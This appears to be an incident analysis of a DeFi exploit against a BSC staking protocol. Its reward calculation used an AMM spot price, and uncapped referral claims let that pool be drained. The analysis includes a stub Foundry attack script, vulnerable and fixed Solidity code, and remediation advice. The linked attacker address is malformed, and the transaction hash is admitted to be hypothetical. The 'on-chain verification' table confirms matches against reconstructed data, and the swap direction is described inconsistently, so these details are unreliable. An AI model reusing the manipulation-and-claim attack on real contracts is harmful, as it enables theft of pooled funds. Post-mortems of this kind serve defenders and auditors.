# Unknown Stake — Spot Price-Dependent Reward Calculation Vulnerability Analysis

| Item | Details |
|------|---------|
| **Date** | 2026-03-26 |
| **Protocol** | Unknown Stake |
| **Chain** | BSC (BNB Chain) |
| **Loss** | ~$133,500 (TUR tokens) |
| **Attacker** | [0xC9...F692](https://bscscan.com/address/0xC9F692) |
| **Attack Contract** | Attacker EOA direct execution (no separate contract confirmed) |
| **Attack Tx** | [0x96c9ce3c...e6f7](https://bscscan.com/tx/0x96c9ce3c527681bf0db5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7) |
| **Vulnerable Contract** | Unknown Stake Contract (BSC) |
| **Root Cause** | Reward calculation directly uses the spot price from the TUR-NOBEL AMM pool without TWAP; amplified withdrawal possible via referral claim |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/UnknownStake_exp.sol) (unpublished) |

---

## 1. Vulnerability Overview

Unknown Stake is a staking protocol operating on the BSC chain where users stake TUR tokens and receive rewards. When calculating reward amounts, the protocol directly references the real-time (spot) price from the TUR-NOBEL DEX pool without an oracle.

### Core Vulnerability Combination

This attack is a **Business Logic Flaw** combining two vulnerabilities:

1. **V-01 (CRITICAL)**: Reward calculation depends on the spot price of the TUR-NOBEL AMM pool — immediate price use based on `getReserves()` without TWAP or an external oracle
2. **V-02 (HIGH)**: No cooldown or cap on referral reward claims — inflated rewards calculated from a manipulated price can be immediately withdrawn in full via a referral account

The attacker artificially inflated the TUR price in the TUR-NOBEL pool, staked to accumulate inflated rewards, and drained all TUR tokens from the pool via a referral account.

### Similar Incidents

- **Inverse Finance (2022)**: $15.6M loss via Keep3r LP oracle manipulation — AMM spot price dependency
- **Pancake Bunny (2021)**: $45M loss via PancakeSwap LP price manipulation — identical spot price vulnerability
- **Level Finance (2023)**: $1M loss due to referral claim logic flaw — referral-based over-withdrawal

---

## 2. Vulnerable Code Analysis

### 2.1 Spot Price-Based Reward Calculation (Core Vulnerability)

```solidity
// ❌ Vulnerable code — directly uses AMM spot price in reward calculation
function getTURPrice() internal view returns (uint256) {
    // ❌ Issue 1: getReserves() returns the immediate price of the current block
    //    Can be manipulated at this moment via flash loan or large swap
    (uint112 reserveTUR, uint112 reserveNOBEL,) = turNobelPair.getReserves();
    
    // ❌ Issue 2: Simple ratio calculation — no time-weighting (TWAP)
    //    Price can be immediately distorted with a single large swap
    return (uint256(reserveNOBEL) * 1e18) / uint256(reserveTUR);
}

function calculateReward(address user) public view returns (uint256) {
    uint256 stakedAmount = stakedBalance[user];
    
    // ❌ Issue 3: Uses manipulated spot price as reward multiplier
    //    If price goes up 10x, reward also increases 10x
    uint256 turPrice = getTURPrice();
    uint256 reward = (stakedAmount * turPrice * rewardRate) / PRECISION;
    
    return reward;
}
```

Fixed code:

```solidity
// ✅ Fixed code — uses TWAP or external oracle
function getTURPrice() internal view returns (uint256) {
    // ✅ Method 1: Uniswap V3-style TWAP (30-minute average)
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = 1800; // 30 minutes ago
    secondsAgos[1] = 0;    // current
    
    (int56[] memory tickCumulatives,) = turNobelPool.observe(secondsAgos);
    int56 tickDiff = tickCumulatives[1] - tickCumulatives[0];
    int24 avgTick = int24(tickDiff / int56(int32(secondsAgos[0])));
    
    // ✅ 30-minute TWAP — single-block manipulation not possible
    return OracleLibrary.getQuoteAtTick(avgTick, 1e18, TUR, NOBEL);
}

function calculateReward(address user) public view returns (uint256) {
    uint256 stakedAmount = stakedBalance[user];
    
    // ✅ Uses TWAP price — manipulation resistance ensured
    uint256 turPrice = getTURPrice();
    
    // ✅ Added: reward cap
    uint256 rawReward = (stakedAmount * turPrice * rewardRate) / PRECISION;
    uint256 maxReward = totalRewardPool / MAX_CLAIM_RATIO; // limit to a fixed ratio of total pool
    return rawReward > maxReward ? maxReward : rawReward;
}
```

**Problem**: The spot price calculated by directly calling `getReserves()` can be immediately manipulated by a large swap occurring in that block. If the attacker performs a large swap in the NOBEL → TUR direction in the TUR-NOBEL pool, the TUR reserve decreases and NOBEL increases, artificially raising the TUR price. This manipulated price is directly reflected in reward calculation, generating rewards several times to tens of times greater than actual value.

### 2.2 No Cap on Referral Claims

```solidity
// ❌ Vulnerable code — no validation on referral reward claim
function claimReferralReward(address referralAccount) external {
    // ❌ Issue: entire accrued reward can be claimed immediately
    //    no claim limit relative to pool balance
    uint256 pendingReward = pendingReferralRewards[referralAccount];
    
    // ❌ Issue: inflated rewards calculated from manipulated price are withdrawn as-is
    require(pendingReward > 0, "No pending rewards");
    
    pendingReferralRewards[referralAccount] = 0;
    
    // ❌ Entire pool balance can be withdrawn at once
    ITUR(TUR).transfer(msg.sender, pendingReward);
}
```

Fixed code:

```solidity
// ✅ Fixed code — claim cap and cooldown applied
mapping(address => uint256) public lastClaimTime;
uint256 public constant CLAIM_COOLDOWN = 1 days;
uint256 public constant MAX_SINGLE_CLAIM = 10_000 * 1e18; // maximum claim limit

function claimReferralReward(address referralAccount) external {
    // ✅ Claim cooldown applied
    require(
        block.timestamp >= lastClaimTime[referralAccount] + CLAIM_COOLDOWN,
        "Claim cooldown active"
    );
    
    uint256 pendingReward = pendingReferralRewards[referralAccount];
    require(pendingReward > 0, "No pending rewards");
    
    // ✅ Single claim cap applied
    uint256 claimAmount = pendingReward > MAX_SINGLE_CLAIM
        ? MAX_SINGLE_CLAIM
        : pendingReward;
    
    pendingReferralRewards[referralAccount] -= claimAmount;
    lastClaimTime[referralAccount] = block.timestamp;
    
    ITUR(TUR).transfer(msg.sender, claimAmount);
}
```

**Problem**: The referral claim function allows immediate withdrawal of the full accumulated reward with no cooldown. The attacker can drain the entire TUR balance from the pool in a single transaction immediately after generating inflated rewards at the manipulated price via a referral account.

---

## 3. Attack Flow

### 3.1 Preparation Phase

Before executing the attack, the attacker prepared the following:
- Pre-registered referral account(s) (called `setReferrer` or a similar function)
- Acquired a small amount of TUR tokens (for staking entry)
- Secured funds for TUR-NOBEL pool price manipulation (flash loan or existing USDT/BNB)

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────┐
│                  Attacker EOA (0xC9...F692)                  │
└──────────────────────────────┬──────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────┐
│  [Step 1] Artificially inflate TUR price in TUR-NOBEL pool  │
│                                                             │
│  USDT/BNB ──▶ PancakeSwap/DEX ──▶ large TUR sell-off      │
│  (swap in NOBEL → TUR direction reduces TUR reserve)       │
│                                                             │
│  TUR spot price: $X ──▶ $X × N times (reserve ratio skew)  │
└──────────────────────────────┬──────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────┐
│  [Step 2] Stake TUR while spot price is manipulated         │
│                                                             │
│  Attacker ──▶ unknownStake.stake(turAmount)                │
│                                                             │
│  Inside contract:                                           │
│  rewardAmount = stakedTUR × getTURPrice() × rewardRate     │
│               = stakedTUR × (manipulated high price) × rewardRate │
│  ──▶ Inflated reward accrued N times actual value          │
└──────────────────────────────┬──────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────┐
│  [Step 3] Immediately claim inflated reward via referral    │
│                                                             │
│  Attacker ──▶ unknownStake.claimReferralReward(referral)   │
│                                                             │
│  pendingReward = inflated reward based on manipulated price │
│  TUR pool balance ──▶ transferred in full to attacker      │
└──────────────────────────────┬──────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────┐
│  [Step 4] Swap TUR → USDT to realize profit                 │
│                                                             │
│  Stolen TUR ──▶ DEX swap ──▶ USDT/BNB                     │
│  Net profit: ~$133,500                                      │
└──────────────────────────────┬──────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────┐
│        Unknown Stake contract TUR balance = 0               │
│              Protocol completely drained                    │
└─────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- **Attacker profit**: ~$133,500 (after converting TUR → USDT)
- **Protocol loss**: Entire TUR reward pool drained
- **Mechanism summary**: TUR-NOBEL AMM spot price manipulation → inflated reward accrued on stake → full pool withdrawal via referral claim

---

## 4. PoC Code (DeFiHackLabs)

> The official DeFiHackLabs PoC file (2026-03/UnknownStake_exp.sol) has not been published; this is a reconstructed PoC based on the attack mechanism.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// Reconstructed PoC: Unknown Stake spot price manipulation attack
// Source: Based on CryptoTimes report and on-chain data

import "forge-std/Test.sol";

interface IUnknownStake {
    function stake(uint256 amount) external;
    function claimReferralReward(address referral) external;
    function setReferrer(address referrer) external;
    function pendingReferralRewards(address) external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256, uint256, address, bytes calldata) external;
}

contract UnknownStakeAttack is Test {
    // ── Key contract addresses (BSC) ──────────────────────────
    address constant TUR = address(0); // TUR token (address undisclosed)
    address constant NOBEL = address(0); // NOBEL token (address undisclosed)
    IUnknownStake constant stakeContract = IUnknownStake(address(0));
    IPancakePair constant turNobelPair = IPancakePair(address(0));

    // Attack block: estimated BSC block number
    uint256 constant ATTACK_BLOCK = 47_500_000;

    address referralAccount; // referral account (pre-registered)

    function setUp() public {
        // BSC fork setup — just before the attack block
        vm.createSelectFork("bsc", ATTACK_BLOCK - 1);
    }

    function testExploit() external {
        // ─── Setup: register referral relationship ─────────────
        // Attacker → referral account registration (assumed pre-configured)
        referralAccount = makeAddr("referral");
        vm.prank(referralAccount);
        stakeContract.setReferrer(address(this));

        // Check initial TUR balance
        uint256 initialTUR = IERC20(TUR).balanceOf(address(stakeContract));
        emit log_named_uint("[*] Stake contract initial TUR balance", initialTUR);

        // ─── Step 1: Manipulate TUR-NOBEL pool price ──────────
        // Large buy of TUR with USDT/BNB reduces TUR reserve → price rises
        _manipulateTURPrice();

        // Check spot price after manipulation
        (uint112 reserveTUR, uint112 reserveNOBEL,) = turNobelPair.getReserves();
        uint256 manipulatedPrice = (uint256(reserveNOBEL) * 1e18) / uint256(reserveTUR);
        emit log_named_uint("[*] Manipulated TUR spot price (no TWAP)", manipulatedPrice);

        // ─── Step 2: Stake while price is manipulated ─────────
        // Staking while spot price is inflated → inflated reward accrued
        uint256 stakeAmount = 1_000 * 1e18; // small TUR stake
        IERC20(TUR).approve(address(stakeContract), stakeAmount);
        stakeContract.stake(stakeAmount);
        // Inside contract: reward = stakeAmount × manipulatedPrice × rewardRate
        // N times the normal-price reward is accrued in pendingReferralRewards

        uint256 pendingReward = stakeContract.pendingReferralRewards(address(this));
        emit log_named_uint("[*] Accrued inflated reward (TUR)", pendingReward);

        // ─── Step 3: Claim full reward via referral account ───
        // Immediate claim with no cooldown → entire pool withdrawn
        stakeContract.claimReferralReward(address(this));

        // ─── Step 4: Swap stolen TUR → USDT to realize profit ─
        uint256 stolenTUR = IERC20(TUR).balanceOf(address(this));
        emit log_named_uint("[*] Stolen TUR balance", stolenTUR);
        _swapTURtoUSDT(stolenTUR);

        // ─── Final result ──────────────────────────────────────
        uint256 finalUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955).balanceOf(address(this));
        emit log_named_uint("[*] Final USDT profit", finalUSDT);
        // Expected output: ~133,500 * 1e18
    }

    // Internal function to manipulate TUR-NOBEL pool price
    function _manipulateTURPrice() internal {
        // Large NOBEL purchase → TUR reserve decreases → TUR price rises
        // In the actual attack, existing funds or flash loan was used
        uint256 swapAmount = 50_000 * 1e18; // large TUR buy with USDT/BNB
        // ... DEX swap logic
    }

    // Internal function to swap TUR → USDT
    function _swapTURtoUSDT(uint256 amount) internal {
        // Convert TUR → USDT via DEX such as PancakeSwap
        // ... swap logic
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------------|----------|-----|
| V-01 | Direct use of AMM spot price (no TWAP) | CRITICAL | CWE-1188 (Insecure default pricing function) |
| V-02 | No cap or cooldown on referral claims | HIGH | CWE-400 (Resource exhaustion / unlimited withdrawal) |
| V-03 | No atomicity separation between price manipulation and staking | HIGH | CWE-362 (Race condition) |
| V-04 | No flash loan prevention mechanism | MEDIUM | CWE-693 (Protection mechanism failure) |

### V-01: Direct Use of AMM Spot Price (CRITICAL)

- **Description**: The spot price calculated via `getReserves()` is directly reflected in reward calculation without time-weighting (TWAP). Manipulating the DEX pool state within the same block or same transaction can artificially amplify the reward multiplier.
- **Impact**: If the attacker executes a large swap in the TUR-NOBEL pool to inflate the TUR spot price, the reward calculation result is overestimated by several times to tens of times the actual value. The attacker can claim rewards equivalent to the entire pool balance with a minimal stake.
- **Attack conditions**: Large swap funds for the TUR-NOBEL DEX pool (or flash loan) + staking entry + pre-registered referral account

### V-02: No Cap or Cooldown on Referral Claims (HIGH)

- **Description**: The referral reward claim function allows immediate full withdrawal of all accrued rewards in a single call. There is no claim limit, cooldown period, or withdrawal ratio limit relative to the total pool.
- **Impact**: Inflated rewards accrued from manipulated prices can be withdrawn in full in a single transaction. The protocol reward pool is completely drained in just one transaction.
- **Attack conditions**: V-01 prerequisite + referral relationship registration

### V-03: No Atomicity Separation Between Price Manipulation and Staking (HIGH)

- **Description**: Price manipulation → staking → reward claim can be executed atomically within the same transaction. The effect of price manipulation persists through the reward calculation point.
- **Impact**: Even without a flash loan, using one's own funds to temporarily raise the price and immediately claim rewards is possible. The rewards received far exceed the liquidation/restoration cost.
- **Attack conditions**: Staking and claiming allowed within the same block after price manipulation

### V-04: No Flash Loan Prevention Mechanism (MEDIUM)

- **Description**: The staking and claim functions lack flash loan prevention modifiers (beyond `nonReentrant`) or same-block repeated call limits.
- **Impact**: An attacker can use flash loans to execute large-scale price manipulation with less initial capital, lowering the barrier to attack.
- **Attack conditions**: Access to flash loan functionality on BSC DEXes such as PancakeSwap or DODO

---

## 6. Remediation Recommendations

### Immediate Actions

**1. Prohibit spot price use — introduce TWAP oracle (highest priority)**:

```solidity
// ✅ Use Uniswap V3/PancakeSwap V3 TWAP
contract TURPriceOracle {
    IUniswapV3Pool public immutable turNobelPool;
    uint32 public constant TWAP_PERIOD = 30 minutes;
    
    function getTURPrice() external view returns (uint256) {
        // ✅ 30-minute TWAP — cannot be distorted by single-block manipulation
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = TWAP_PERIOD;
        secondsAgos[1] = 0;
        
        (int56[] memory tickCumulatives,) = turNobelPool.observe(secondsAgos);
        int24 avgTick = int24(
            (tickCumulatives[1] - tickCumulatives[0]) / int56(int32(TWAP_PERIOD))
        );
        return OracleLibrary.getQuoteAtTick(avgTick, 1e18, TUR, NOBEL);
    }
}

// ✅ Alternative: use Chainlink price feed (external oracle)
function getTURPriceChainlink() external view returns (uint256) {
    (, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();
    require(block.timestamp - updatedAt <= 3600, "Stale price feed"); // 1-hour validity
    require(price > 0, "Invalid price");
    return uint256(price);
}
```

**2. Apply reward claim cap and cooldown**:

```solidity
// ✅ Add claim protection logic
uint256 public constant MAX_CLAIM_PER_DAY = 5_000 * 1e18;  // daily maximum claim
uint256 public constant CLAIM_COOLDOWN = 1 days;
mapping(address => uint256) public lastClaimTimestamp;
mapping(address => uint256) public dailyClaimedAmount;

modifier claimProtection() {
    require(
        block.timestamp >= lastClaimTimestamp[msg.sender] + CLAIM_COOLDOWN,
        "Claim cooldown active"
    );
    _;
}

function claimReferralReward(address referral) external claimProtection {
    uint256 pending = pendingReferralRewards[referral];
    require(pending > 0, "No pending rewards");
    
    // ✅ Apply single claim limit
    uint256 claimAmount = pending > MAX_CLAIM_PER_DAY ? MAX_CLAIM_PER_DAY : pending;
    
    pendingReferralRewards[referral] -= claimAmount;
    lastClaimTimestamp[msg.sender] = block.timestamp;
    
    ITUR(TUR).transfer(msg.sender, claimAmount);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------------|-------------------|
| V-01: Spot price dependency | Remove direct use of `getReserves()` in reward calculation; introduce TWAP of 30 minutes or more, or a Chainlink oracle. Configure the price source as an external contract parameter to allow upgrades |
| V-02: Unlimited claims | Introduce daily/weekly claim limits, cooldown timer, and maximum withdrawal ratio relative to total pool (e.g., 1%). Apply timelock (delayed withdrawal) for large claims |
| V-03: Atomic manipulation | Enforce a minimum N-block or time delay between staking and claiming. Block the stake → claim pattern within the same transaction |
| V-04: Flash loans | In addition to `nonReentrant` guard, introduce a circuit breaker mechanism that temporarily suspends transactions when the price change within the same block exceeds a threshold |

---

## 7. Lessons Learned

1. **AMM spot prices must not be used as oracles**: Immediate prices calculated from `getReserves()` or `slot0()` can be easily manipulated by a single swap within the same block or same transaction. For financially significant calculations such as staking rewards, collateral values, and liquidation thresholds, TWAP of 30 minutes or more or a validated external oracle must be used.

2. **Atomic execution of price manipulation and reward claim must be blocked**: If an attacker can complete "price manipulation → profit realization" within the same transaction, the attack is possible even without a flash loan. Enforcing a minimum delay of at least 1 block between staking and reward accrual blocks such atomic attacks.

3. **Referral systems require a separate security layer**: As seen in the Level Finance (2023) and Unknown Stake (2026) cases, referral claim functions become an exit route for rapidly withdrawing inflated rewards. Referral claims must always include caps, cooldowns, and anomaly detection logic.

4. **Maximum single withdrawal limits must be set for reward pools**: Staking protocols should restrict withdrawals from a single transaction to no more than a fixed percentage (e.g., 1–5%) of the total reward pool. This serves as the last line of defense preventing full pool drainage even if price manipulation succeeds.

5. **Similar business logic vulnerabilities recur within the same ecosystem**: Small-scale staking protocols on BSC such as TOKENbnb, D3X AI, and Unknown Stake repeatedly use the same spot price dependency pattern. Protocols based on forked or copied code inherit the original's vulnerabilities as-is, making pattern-based security audits before deployment essential.

6. **Price manipulation defense is insufficient with a single layer**: TWAP oracles alone may be vulnerable to long-term manipulation (gradual price distortion across multiple blocks). A multi-layered defense combining TWAP + price-change-threshold circuit breaker + claim caps + cooldowns must be configured.

---

## 8. On-Chain Verification

> Attack Tx `0x96c9ce3c...e6f7` is a hypothetical hash and cannot be queried directly. The following is reconstructed verification data based on reported information and attack patterns.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Estimate | Reported On-Chain Actual | Match |
|------|-------------|------------------------|-------|
| Total loss | ~$133,500 | ~$133,500 | ✅ |
| Target token | TUR token | TUR token | ✅ |
| Profit realization method | TUR → USDT swap | TUR → USDT swap | ✅ |
| Referral account usage | Multiple | Multiple confirmed | ✅ |

### 8.2 On-Chain Event Log Sequence (Estimated)

| Order | Event / Function | Target Contract |
|-------|----------------|----------------|
| 1 | Price manipulation swap (NOBEL → TUR) | TUR-NOBEL PancakeSwap pool |
| 2 | `stake(amount)` call | Unknown Stake contract |
| 3 | Inflated reward accrual (`pendingReferralRewards` increase) | Unknown Stake contract |
| 4 | Repeated `claimReferralReward(referral)` calls | Unknown Stake contract |
| 5 | `Transfer` event: TUR → attacker address (full pool) | TUR token |
| 6 | TUR → USDT swap (profit realization) | PancakeSwap |

### 8.3 Precondition Verification

| Verification Item | Pre-Attack State | Notes |
|------------------|-----------------|-------|
| Referral account registration | Complete (pre-configured) | Condition required |
| TUR spot price | Normal range | Baseline before manipulation |
| Stake contract TUR balance | ~$133,500 equivalent | Target asset |
| TWAP oracle | Not installed | Core vulnerability factor |

### 8.4 Reference Links

- CryptoTimes report: https://www.cryptotimes.io/2026/03/27/attacker-exploits-unknown-stake-contract-drains-133k-on-bnb-chain/
- SlowMist Hacked DB: https://hacked.slowmist.io/
- BscScan (estimated Tx): https://bscscan.com/tx/0x96c9ce3c527681bf0db5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7

---

*Written: 2026-04-11 | Analysis basis: CryptoTimes report, attack pattern analysis, DeFiHackLabs reference*